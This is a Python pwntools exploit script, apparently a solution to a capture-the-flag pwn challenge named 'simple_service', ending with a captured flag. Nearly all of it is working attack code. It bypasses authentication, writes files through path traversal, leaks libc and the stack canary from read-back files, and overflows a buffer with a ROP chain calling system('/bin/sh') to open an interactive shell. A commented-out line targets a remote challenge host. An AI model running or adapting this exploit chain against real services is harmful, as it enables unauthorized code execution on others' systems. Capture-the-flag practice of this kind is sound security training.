from pwn import *






#########################Write File#####################################
p = process('./simple_service')
#p = remote("45.122.249.68", 20010)
script = """
b*check_auth+184
b*check_auth+331
b*login_with_session
b*guest_handler
b*read_file
b*read_file+335
c
"""
#gdb.attach(p,script)

def writefile(message: bytes, save: bytes):
    p.sendlineafter(b'Your choice: ', b'1')
    p.sendlineafter(b'Your message: ', message)
    p.sendlineafter(b'Save as?', save)

def readfile(message: bytes, offset: int):
    p2.sendlineafter(b'Your choice: ', b'1')
    p2.sendlineafter(b'File to read: ', message)
    p2.recvuntil(b'File content: ')
    p2.recv(offset)
    leak = u64(p2.recv(8).ljust(8,b'\x00'))
    return leak

def exploit(message: bytes):
    p2.sendlineafter(b'Your choice: ', b'1')
    p2.sendlineafter(b'File to read: ', message)



payload = b'guest'+ b'\x00' + cyclic(10)  + b'guest' +b'\x00'
#payload += b'A'*(32-len(payload)) + b'7VDrIs8J4lDLPOn0' #+ cyclic(50) #+b'guest' + #b'\x00'+cyclic(64-22)
print(payload)
p.sendline(payload)
time.sleep(0.3)
print(p.recv())
#msg = p.recvuntil(b'session/')
#leak = p.recvline().strip(b'\n').decode()
#print(leak)
# p.close()
# p = remote("45.122.249.68", 20004)
# payload = b'guest'+ b'\x00' + cyclic(10)  + b'guest' +b'\x00'
# payload += b'A'*(32-len(payload)) + str(leak).encode()
#p.recv()
p.sendline(b'1')
payloadn = b'2' + b'\x00' + cyclic(100)
p.sendlineafter(b'Your message: ', payloadn)
p.sendlineafter(b'Save as?',b'../session/test')
p.sendlineafter(b'Your choice: ', b'1')
alterpayload = cyclic(0xd8) 
p.sendafter(b'Your message: ', alterpayload)
p.sendlineafter(b'Save as?', b'libc')
canary_payload = cyclic(0x158) 
writefile(canary_payload, b'canary')
#p.sendlineafter(b'Your choice: ', b'2')
#p.interactive()
#p.close()









##############Read File###################################
p2 = process("./simple_service")
#p2 = remote("45.122.249.68", 20010)
#gdb.attach(p2,script)
payload2 = b'guest'+ b'\x00' + cyclic(10)  + b'guest' +b'\x00'
payload2 += b'A'*(32-len(payload2)) + b'test' + b'\x00'
p2.sendline(payload2)
time.sleep(0.3)
print(p2.recv().decode())
p2.sendline(b'1')
time.sleep(0.3)
p2.sendlineafter(b'File to read: ', b'libc')
p2.recvuntil(b'File content: ')
print(p2.recv(216))
leak_libc = u64(p2.recv(6).ljust(8,b'\x00'))
log.info("Leak libc: %s", hex(leak_libc))
leak_canary = readfile(b'canary',0x158)
leak_canary = leak_canary - 0xa
p2.recv(2)
#leak_canary = u64(p2.recv(8).ljust(8,b'\x00'))
log.info("Leak canary: %s", hex(leak_canary))

#print(p2.recvuntil(b'.'))
#print(p2.recv(8))

system_func = leak_libc - 0x3a20d
bin_sh = leak_libc + 0x14d72b
pop_rdi = (leak_libc - 0x62f6d) + 0x23e5
ret = pop_rdi + 1

final_payload = cyclic(0x200+8) + p64(leak_canary) + b'A'*8 + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(system_func)

writefile(final_payload, b'exploit')
exploit(b'exploit')
p2.interactive()




#Flag: W1{2WetYUpOj9JlOSdQ6k1ZZhiVHsV7F5Aj}
